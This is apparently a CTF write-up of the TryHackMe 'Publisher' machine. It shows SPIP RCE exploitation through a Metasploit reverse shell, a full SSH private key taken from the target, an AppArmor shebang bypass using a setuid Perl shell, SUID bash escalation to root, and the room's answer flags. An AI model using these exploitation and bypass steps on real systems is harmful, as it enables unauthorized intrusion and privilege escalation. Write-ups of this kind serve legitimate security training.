---
title: "TryHackMe - Publisher"
date: 2025-03-20 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [linpeas, metasploit, privilege escalation, apparmor, ]

---
## Introduction

In this post, I will walk you through how I successfully exploited a vulnerability in SPIP [(CVE-2023-27372)](https://nvd.nist.gov/vuln/detail/CVE-2023-27372) to escalate privileges and gain root access on a vulnerable machine. This is a detailed write-up of the process, which includes scanning the target, discovering vulnerabilities, and leveraging them to gain control over the system.


## Reconnaissance

To begin, I scanned the target IP (10.10.x.x) with Nmap to gather information about the services running on the machine:

```console
nmap -sC -sV -Pn 10.10.x.x
```
Next, I performed directory enumeration using Gobuster to discover potential hidden directories or files:

```console
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
```
and 

```console
gobuster dir -u http://10.10.x.x/spip -w /usr/share/wordlists/dirb/common.txt
```
I then identified the web application using WhatWeb:

```console
whatweb http://10.10.x.x./spip
```
This revealed that the target was running SPIP, a content management system and allowed me to find out that SPIP is running version 4.2, and I am using Metasploit to search for available exploits.

```console
searchsploit spip 4.2
```
I found the following exploit:

```yaml
exploit/multi/http/spip_rce_form       2023-02-27       excellent  Yes    SPIP form PHP Injection
```
## Using Metasploit to Exploit the Vulnerability
I decided to use Metasploit to exploit the vulnerability. Here are the steps to configure and launch the attack:

```console 

msfconsole

msf6 > use exploit/multi/http/spip_rce_form

set RHOST 	IP_MACHINE
SET TARGETURI  /spip
SET LHOST	MY_IP
SET LPORT	4444

exploit

```
Once the exploit was successful, I gained a shell on the machine.

With the shell open, I was able to read the first flag:

**FLAG 1:  fa229046d44eda6a3598c73ad96f4ca5**

## Obtaining SSH Private Key

While exploring the user files, I found a private SSH key used for login. I copied it to my local machine and configured SSH access:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


```console
chmod 600 id_rsa
ssh -i id_rsa think@10.10.x.x
```

## Privilege Escalation

Now, I wanted to escalate my privileges to root. The hints suggested looking into AppArmor profiles. I searched for files with the SUID bit set (files that execute with the owner's permissions), which could lead to privilege escalation:

```console 

find / -perm -u=s -type f 2>/dev/null

```
One such file - **run_container.sh**, caught my attention. Checking its permissions:

```console
ls -l /opt/run_container.sh
```

Although I had write access, I was denied permission to modify it, likely due to AppArmor restrictions. I used **linpeas.sh** to gather more information about the system.


![Linpeas AppArmor](/images/apparmor.jpg)


I see that AppArmor is enabled, and I check the shell by running

```console
echo $SHELL
```
It turns out that the shell is not Bash but Ash, and there is an AppArmor profile for the current shell.
I search for more information about the Ash shell and find some details about this profile at:

<Br>**/etc/apparmor.d/usr.sbin.ash**

```console

think@publisher:/etc/apparmor.d$ cat usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}

```

Writing to many critical directories, such as /opt/, /tmp/, /dev/shm/, /var/tmp/, and user directories in /home/, is restricted. This means that many common attack techniques that rely on writing files to these locations (e.g., injecting malicious code) are blocked.

The last step is to check the binary /usr/sbin/run_container.

```console
string /usr/sbin/run_container
```

The file contains a reference to /opt/run_container.sh, which suggests that this script is one of the main components executed by the program.
Having access to run the script or modify its contents would allow me to inject my own command.

While searching online, I found a method to bypass AppArmor and create an unrestricted shell:
[ AppArmor Shebang Bypass - HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/apparmor.html#apparmor-shebang-bypass)

I just need to modify it so that it writes to **/dev/shm** instead of **/tmp**, since the rules shown earlier prohibit writing to **/tmp**.

The final script looks like this:

```console

echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /dev/shm/test.pl
chmod +x dev/shm/test.pl
dev/shm/test.pl
```

Thanks to this, I can now modify **run_container.sh**

```console
nano /opt/run_container.sh
```

And I add the following

![run_container.sh](/images/runcontainer.png)

Now, I just need to run the script.
```console
/usr/sbin/run_container
```

And I escalate to root.

```console
cd /tmp
./bash -p
whoami
root
```

Now I can read the root flag.

```console
cd /root 
cat root.txt

```


**Flag 2 :  3a4225cc9e85709adda6ef55d6a4f2ca**